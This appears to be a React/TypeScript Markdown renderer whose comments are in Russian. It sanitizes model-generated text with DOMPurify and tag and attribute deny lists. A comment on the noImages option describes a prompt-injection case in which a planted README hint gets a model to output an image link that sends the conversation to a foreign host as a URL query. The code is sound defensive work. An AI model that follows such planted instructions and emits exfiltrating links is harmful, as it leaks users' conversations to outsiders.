import { useMemo } from 'react';
import { marked } from 'marked';
import DOMPurify from 'dompurify';

interface Props {
  markdown: string;
  /** Базовый URL репозитория для относительных ссылок и картинок. Без него относительные ссылки теряют href, картинки убираются. */
  repoUrl?: string;
  branch?: string;
  /** Одиночный перенос строки — как <br> (для заметок, где Enter значит «новая строка»). */
  breaks?: boolean;
  /** Чек-боксы задач кликабельны (обработку клика делает родитель). */
  interactiveTasks?: boolean;
  /**
   * Текст от модели: ничего не загружать само (картинки, медиа, url() в style). Иначе подсказка из чужого
   * README может велеть модели вставить `![](https://чужой/?q=<разговор>)`, и браузер унесёт разговор.
   */
  noImages?: boolean;
}

// Три уровня запретов поверх профиля html (S10); каждый следующий включает предыдущий. Склеиваем массивы, не объекты.
const ALWAYS = { tags: ['style'], attrs: ['style'] };
// Без внешних загрузок (заметки инструмента, чат). input не запрещён ради чек-боксов, input type=image гасит запрет src.
const NO_EXTERNAL = { tags: ['img', 'picture', 'source', 'video', 'audio', 'track', 'image'], attrs: ['src', 'srcset', 'poster', 'background'] };
// Текст модели — только оформление текста: ни форм, ни имён и классов интерфейса.
const MODEL = { tags: ['form', 'input', 'button', 'textarea', 'select'], attrs: ['id', 'name', 'class', 'popover', 'popovertarget', 'popovertargetaction'] };

const IMAGE_HIDDEN = '[картинка скрыта]';

/** Вместо картинок, которые не показываем, оставляем пометку (разбор в DOMParser ничего не загружает). */
function hideImages(html: string): string {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  const imgs = doc.querySelectorAll('img');
  if (!imgs.length) return html;
  for (const img of imgs) img.replaceWith(IMAGE_HIDDEN);
  return doc.body.innerHTML;
}

export function toSafeHtml(markdown: string, { repoUrl, branch, breaks = false, interactiveTasks = false, noImages = false }: Omit<Props, 'markdown'>): string {
  const noExternal = noImages || !repoUrl;
  let raw = marked.parse(markdown, { async: false, breaks }) as string;
  if (noExternal) raw = hideImages(raw);
  const clean = DOMPurify.sanitize(raw, {
    USE_PROFILES: { html: true },
    ADD_ATTR: ['target', 'align', 'width', 'height'],
    FORBID_TAGS: [...ALWAYS.tags, ...(noExternal ? NO_EXTERNAL.tags : []), ...(noImages ? MODEL.tags : [])],
    FORBID_ATTR: [...ALWAYS.attrs, ...(noExternal ? NO_EXTERNAL.attrs : []), ...(noImages ? MODEL.attrs : [])],
  });
  return absolutize(clean, repoUrl, branch, interactiveTasks, noExternal);
}

marked.setOptions({ gfm: true, breaks: false });

function absolutize(html: string, repoUrl: string | undefined, branch: string | undefined, interactiveTasks: boolean, plain: boolean): string {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  const blobBase = repoUrl ? `${repoUrl}/blob/${branch ?? ''}/` : '';
  const rawBase = repoUrl ? `${repoUrl.replace('https://github.com/', 'https://raw.githubusercontent.com/')}/${branch ?? ''}/` : '';
  const isRelative = (u: string) => u && !/^(?:[a-z]+:|\/\/|#|mailto:)/i.test(u);
  // DOMPurify пропускает адреса вроде `\/[`, на которых new URL бросает исключение — такой атрибут просто убираем.
  const resolve = (el: Element, attr: string, u: string, base: string) => {
    try {
      el.setAttribute(attr, new URL(u, base).toString());
    } catch {
      el.removeAttribute(attr);
    }
  };

  for (const a of doc.querySelectorAll('a[href]')) {
    const href = a.getAttribute('href') ?? '';
    if (isRelative(href)) {
      if (repoUrl) resolve(a, 'href', href, blobBase);
      else a.removeAttribute('href'); // чужой сайт: относительный адрес некуда вести
    }
    if (a.hasAttribute('href') && !href.startsWith('#')) {
      a.setAttribute('target', '_blank');
      a.setAttribute('rel', 'noopener noreferrer');
    }
  }
  // Ссылка без адреса — не ссылка: не синяя и не называется диктором ссылкой.
  if (plain) {
    for (const a of doc.querySelectorAll('a:not([href])')) {
      const span = doc.createElement('span');
      span.append(...a.childNodes);
      a.replaceWith(span);
    }
  }
  for (const img of doc.querySelectorAll('img[src]')) {
    const src = img.getAttribute('src') ?? '';
    if (isRelative(src)) resolve(img, 'src', src, rawBase);
    img.setAttribute('loading', 'lazy');
  }
  if (interactiveTasks) {
    for (const box of doc.querySelectorAll('input[type="checkbox"]')) box.removeAttribute('disabled');
  }
  return doc.body.innerHTML;
}

export function Markdown({ markdown, repoUrl, branch, breaks = false, interactiveTasks = false, noImages = false }: Props) {
  const html = useMemo(
    () => toSafeHtml(markdown, { repoUrl, branch, breaks, interactiveTasks, noImages }),
    [markdown, repoUrl, branch, breaks, interactiveTasks, noImages],
  );
  // eslint-disable-next-line react/no-danger -- HTML прошёл через DOMPurify
  return <div className="prose" dangerouslySetInnerHTML={{ __html: html }} />;
}
